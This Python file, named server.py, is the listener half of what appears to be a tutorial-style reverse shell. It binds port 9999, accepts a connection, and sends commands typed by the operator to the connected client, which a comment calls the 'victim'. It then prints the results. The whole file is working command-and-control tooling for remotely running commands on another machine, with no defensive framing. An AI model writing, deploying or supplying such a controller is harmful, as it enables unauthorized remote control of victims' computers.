# This file is considered as server.py
import socket
import sys

# Create a Socket (connect 2 computers)
def create_socket():
    try:
        global host # IP address
        global port 
        global s    # Socket

        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and Listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket creation error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish the connection with the client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established: |" + " IP: " + address[0] + " | Port: " + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands to client /victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


# Create the main() function
def main():
    create_socket()
    bind_socket()
    socket_accept()

main()

